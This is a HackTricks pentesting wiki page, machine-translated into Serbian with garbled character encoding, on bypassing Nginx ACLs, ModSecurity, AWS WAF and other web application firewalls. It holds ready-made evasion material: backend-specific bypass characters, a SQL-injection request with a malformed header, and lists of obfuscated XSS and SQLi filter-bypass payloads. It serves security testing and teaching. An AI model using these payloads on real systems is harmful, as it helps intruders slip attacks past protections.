# Proxy / WAF Protections Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Tehnike [iz ove studije](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Primer Nginx pravila:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Da bi se spreÄili zaobilaÅ¾enja, Nginx vrÅ¡i normalizaciju putanje pre nego Å¡to je proveri. MeÄ‘utim, ako backend server vrÅ¡i drugaÄiju normalizaciju (uklanjajuÄ‡i karaktere koje Nginx ne uklanja), moÅ¾e biti moguÄ‡e zaobiÄ‡i ovu odbranu.

### **NodeJS - Express**

| Nginx Verzija | **Node.js Karakteri za zaobilaÅ¾enje** |
| -------------- | ------------------------------------- |
| 1.22.0        | `\xA0`                               |
| 1.21.6        | `\xA0`                               |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`               |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`               |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`               |

### **Flask**

| Nginx Verzija | **Flask Karakteri za zaobilaÅ¾enje**                                   |
| -------------- | --------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                  |
| 1.21.6        | `\x85`, `\xA0`                                                  |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Verzija | **Spring Boot Karakteri za zaobilaÅ¾enje** |
| -------------- | ----------------------------------------- |
| 1.22.0        | `;`                                       |
| 1.21.6        | `;`                                       |
| 1.20.2        | `\x09`, `;`                               |
| 1.18.0        | `\x09`, `;`                               |
| 1.16.1        | `\x09`, `;`                               |

### **PHP-FPM**

Nginx FPM konfiguracija:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx je konfigurisan da blokira pristup `/admin.php`, ali je moguÄ‡e zaobiÄ‡i ovo pristupom `/admin.php/index.php`.

### Kako spreÄiti
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**U ovom postu**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) objaÅ¡njeno je da ModSecurity v3 (do 3.0.12), **nepravilno implementira `REQUEST_FILENAME`** varijablu koja je trebala da sadrÅ¾i pristupnu putanju (do poÄetka parametara). To je zato Å¡to je izvrÅ¡avao URL dekodiranje da bi dobio putanju.\
Zato, zahtev kao `http://example.com/foo%3f';alert(1);foo=` u mod security Ä‡e pretpostaviti da je putanja samo `/foo` jer se `%3f` transformiÅ¡e u `?` koji zavrÅ¡ava URL putanju, ali zapravo putanja koju server prima biÄ‡e `/foo%3f';alert(1);foo=`.

Varijable `REQUEST_BASENAME` i `PATH_INFO` su takoÄ‘e bile pogoÄ‘ene ovom greÅ¡kom.

NeÅ¡to sliÄno se dogodilo u verziji 2 Mod Security koja je omoguÄ‡ila zaobilaÅ¾enje zaÅ¡tite koja je spreÄavala korisnike da pristupaju datotekama sa specifiÄnim ekstenzijama vezanim za rezervne datoteke (kao Å¡to su `.bak`) jednostavno slanjem taÄke URL kodirane u `%2e`, na primer: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[Ova istraÅ¾ivanja](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) pominju da je bilo moguÄ‡e zaobiÄ‡i AWS WAF pravila primenjena na HTTP zaglavlja slanjem "neispravnog" zaglavlja koje nije pravilno analizirano od strane AWS-a, ali jeste od strane backend servera.

Na primer, slanjem sledeÄ‡eg zahteva sa SQL injekcijom u zaglavlju X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
MoguÄ‡e je zaobiÄ‡i AWS WAF jer nije razumeo da je sledeÄ‡a linija deo vrednosti zaglavlja dok je NODEJS server to razumeo (ovo je ispravljeno).

## GeneriÄki WAF zaobilaÅ¾enja

### OgraniÄenja veliÄine zahteva

ObiÄno WAF-ovi imaju odreÄ‘eno ograniÄenje duÅ¾ine zahteva za proveru i ako je POST/PUT/PATCH zahtev veÄ‡i od toga, WAF neÄ‡e proveriti zahtev.

* Za AWS WAF, moÅ¾ete [**proveriti dokumentaciju**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Maksimalna veliÄina tela web zahteva koja moÅ¾e biti pregledana za zaÅ¡titu od Application Load Balancer i AWS AppSync</td><td>8 KB</td></tr><tr><td>Maksimalna veliÄina tela web zahteva koja moÅ¾e biti pregledana za zaÅ¡titu od CloudFront, API Gateway, Amazon Cognito, App Runner i Verified Access**</td><td>64 KB</td></tr></tbody></table>

* Iz [**Azure dokumenata**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Stariji Web Application Firewalls sa Core Rule Set 3.1 (ili niÅ¾im) dozvoljavaju poruke veÄ‡e od **128 KB** iskljuÄivanjem inspekcije tela zahteva, ali te poruke neÄ‡e biti proverene na ranjivosti. Za novije verzije (Core Rule Set 3.2 ili novije), isto se moÅ¾e uraditi iskljuÄivanjem maksimalnog ograniÄenja veliÄine tela zahteva. Kada zahtev premaÅ¡i ograniÄenje veliÄine:

Ako je **mod prevencije**: Zapisuje i blokira zahtev.\
Ako je **mod detekcije**: Pregleda do ograniÄenja, ignoriÅ¡e ostatak i beleÅ¾i ako `Content-Length` premaÅ¡i ograniÄenje.

* Iz [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Podrazumevano, WAF pregledava samo prvih 8KB zahteva. MoÅ¾e poveÄ‡ati ograniÄenje do 128KB dodavanjem Naprednih Metapodataka.

* Iz [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Do 128KB.

### Obfuskacija <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode Kompatibilnost <a href="#unicode-compatability" id="unicode-compatability"></a>

U zavisnosti od implementacije Unicode normalizacije (viÅ¡e informacija [ovde](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), karakteri koji dele Unicode kompatibilnost mogu biti u moguÄ‡nosti da zaobiÄ‘u WAF i izvrÅ¡e se kao predviÄ‘eni payload. Kompatibilni karakteri se mogu naÄ‡i [ovde](https://www.compart.com/en/unicode).

#### Primer <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

* [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): GeneriÅ¡ite URL API gateway-a koji Ä‡e se koristiti sa ffuf
* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): SliÄno fireprox
* [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite dodatak koji koristi IP adrese API gateway-a
* [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): DinamiÄki odreÄ‘eni broj instanci kontejnera se aktivira na osnovu veliÄine ulazne datoteke i faktora deljenja, pri Äemu se ulaz deli na delove za paralelno izvrÅ¡avanje, kao Å¡to je 100 instanci koje obraÄ‘uju 100 delova iz ulazne datoteke od 10.000 redova sa faktorom deljenja od 100 redova.

### Regex Bypasses

RazliÄite tehnike se mogu koristiti za zaobilaÅ¾enje regex filtera na vatrozidima. Primeri ukljuÄuju naizmeniÄno koriÅ¡Ä‡enje velikih i malih slova, dodavanje preloma linija i kodiranje payload-a. Resursi za razliÄite zaobilaÅ¾enja mogu se naÄ‡i na [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) i [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). Primeri u nastavku su preuzeti iz [ovog Älanka](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Alati

* [**nowafpls**](https://github.com/assetnote/nowafpls): Burp dodatak za dodavanje beskorisnih podataka u zahteve kako bi se zaobiÅ¡li WAF-ovi po duÅ¾ini

## Reference

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
* [https://www.youtube.com/watch?v=0OMmWtU2Y\_g](https://www.youtube.com/watch?v=0OMmWtU2Y\_g)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
